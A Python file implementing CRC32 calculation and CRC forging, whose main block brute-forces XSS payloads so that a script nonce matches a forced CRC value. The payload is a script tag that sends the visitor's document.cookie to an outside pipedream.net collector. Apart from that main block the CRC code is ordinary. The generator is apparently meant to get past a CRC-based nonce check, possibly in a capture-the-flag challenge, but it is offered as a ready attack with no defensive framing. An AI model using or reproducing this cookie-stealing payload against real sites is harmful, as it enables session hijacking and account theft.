#!/usr/bin/python
# https://github.com/StalkR/misc/blob/master/crypto/crc32.py

"""Calculate and manipulate CRC32.
http://en.wikipedia.org/wiki/Cyclic_redundancy_check
-- StalkR
"""
from string import printable
from zlib import crc32
import struct
import sys

# Polynoms in reversed notation
POLYNOMS = {
  'CRC-32-IEEE': 0xedb88320, # 802.3
  'CRC-32C': 0x82F63B78, # Castagnoli
  'CRC-32K': 0xEB31D82E, # Koopman
  'CRC-32Q': 0xD5828281,
}

class Error(Exception):
  pass

class CRC32(object):
  """A class to calculate and manipulate CRC32.
  
  Use one instance per type of polynom you want to use.
  Use calc() to calculate a crc32.
  Use forge() to forge crc32 by adding 4 bytes anywhere.
  """
  def __init__(self, type="CRC-32-IEEE"):
    if type not in POLYNOMS:
      raise Error("Unknown polynom. %s" % type)
    self.polynom = POLYNOMS[type]
    self.table, self.reverse = [0]*256, [0]*256
    self._build_tables()

  def _build_tables(self):
    for i in range(256):
      fwd = i
      rev = i << 24
      for j in range(8, 0, -1):
        # build normal table
        if (fwd & 1) == 1:
          fwd = (fwd >> 1) ^ self.polynom
        else:
          fwd >>= 1
        self.table[i] = fwd & 0xffffffff
        # build reverse table =)
        if rev & 0x80000000 == 0x80000000:
          rev = ((rev ^ self.polynom) << 1) | 1
        else:
          rev <<= 1
        rev &= 0xffffffff
        self.reverse[i] = rev

  def calc(self, s):
    """Calculate crc32 of a string.
    Same crc32 as in (binascii.crc32)&0xffffffff.
    """
    crc = 0xffffffff
    for c in s:
      crc = (crc >> 8) ^ self.table[(crc ^ ord(c)) & 0xff]
    return crc^0xffffffff

  def forge(self, wanted_crc, s, pos=None):
    """Forge crc32 of a string by adding 4 bytes at position pos."""
    if pos is None:
      pos = len(s)
    
    # forward calculation of CRC up to pos, sets current forward CRC state
    fwd_crc = 0xffffffff
    for c in s[:pos]:
      fwd_crc = (fwd_crc >> 8) ^ self.table[(fwd_crc ^ ord(c)) & 0xff]
    
    # backward calculation of CRC up to pos, sets wanted backward CRC state
    bkd_crc = wanted_crc^0xffffffff
    for c in s[pos:][::-1]:
      bkd_crc = ((bkd_crc << 8)&0xffffffff) ^ self.reverse[bkd_crc >> 24] ^ ord(c)
    
    # deduce the 4 bytes we need to insert
    for c in struct.pack('<L',fwd_crc)[::-1]:
      bkd_crc = ((bkd_crc << 8)&0xffffffff) ^ self.reverse[bkd_crc >> 24] ^ c
    
    res = s[:pos] + struct.pack('<L', bkd_crc).decode('latin-1') + s[pos:]
    assert(crc32(res.encode('latin-1')) == wanted_crc)
    return res.encode('latin-1')

if __name__=='__main__':
  crc = CRC32()
  printable = printable[:-5].encode('ascii')
  for i in range(4294967296):
    data = crc.forge(i, f'<script nonce={i:0>8x}>this.location="https://eoq96or4f0kkfg1.m.pipedream.net?"+document.cookie</script>')
    if all(x in printable for x in data[-4:]):
      print(data)
